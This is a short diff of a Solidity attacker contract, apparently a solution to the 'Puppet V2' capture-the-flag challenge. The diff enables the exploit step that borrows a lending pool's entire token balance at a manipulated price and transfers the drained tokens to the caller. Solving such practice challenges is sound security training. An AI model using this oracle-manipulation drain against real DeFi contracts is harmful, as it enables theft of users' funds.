@@ -53,11 +53,16 @@ contract Puppet2Attacker{
         weth.deposit{value: msg.value}();
 
         uint256 needed = puppet2.calculateDepositOfWETHRequired(initialPoolAmount);
-        // puppet2.borrow(initialPoolAmount);
+        weth.approve(address(puppet2), needed);
+        puppet2.borrow(initialPoolAmount);
 
-        console.log("cccccc %s", address(this).balance);
-        console.log("bbbbbb %s", weth.balanceOf(address(this)));
-        console.log("aaaaaa %s", needed);
+        uint256 totalTokens = token.balanceOf(address(this));
+        token.approve(msg.sender, totalTokens);
+        token.transfer(msg.sender, totalTokens);
+
+        // console.log("cccccc %s", address(this).balance);
+        // console.log("bbbbbb %s", weth.balanceOf(address(this)));
+        // console.log("aaaaaa %s", needed);
     }
 
     receive() payable external{
